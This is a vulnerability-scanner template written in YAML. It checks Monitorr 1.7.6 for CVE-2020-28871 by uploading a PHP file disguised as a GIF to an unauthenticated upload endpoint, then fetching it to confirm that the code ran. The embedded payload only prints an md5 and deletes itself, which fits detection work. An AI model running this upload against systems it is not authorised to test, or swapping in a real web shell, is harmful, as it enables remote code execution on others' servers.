name: yaml-poc-monitorr_project-monitorr-logical-CVE-2020-28871
binding: 325ec762-509f-4fe2-b29d-c31072b06d2f
detail:
    author: jiapeng.han
    links:
        - http://packetstormsecurity.com/files/163263/Monitorr-1.7.6m-Bypass-Information-Disclosure-Shell-Upload.html
        - http://packetstormsecurity.com/files/170974/Monitorr-1.7.6-Shell-Upload.html
        - http://packetstormsecurity.com/files/171429/Monitorr-1.7.6m-1.7.7d-Remote-Code-Execution.html
        - https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
        - https://packetstormsecurity.com/files/163263/Monitorr-1.7.6m-Bypass-Information-Disclosure-Shell-Upload.html
        - https://www.exploit-db.com/exploits/48980
    vulnerability:
        id: e2ce24c4-3539-4bf2-9f9d-5521520af739
        level: critical
    warning: File Upload
transport: http
set:
    f4: string(randomInt(400001, 500000))
    rboundary: randomLowercase(8)
    randname: randomLowercase(6)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /assets/php/upload.php
            headers:
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
            body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"{{randname}}.php\"\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123<?php print(md5('{{f4}}'));unlink(__FILE__);\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
            follow_redirects: false
        expression: response.status == 200
    r1:
        request:
            cache: true
            method: GET
            path: /assets/data/usrimg/{{randname}}.php
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes(md5(f4)))
expression: r0() && r1()
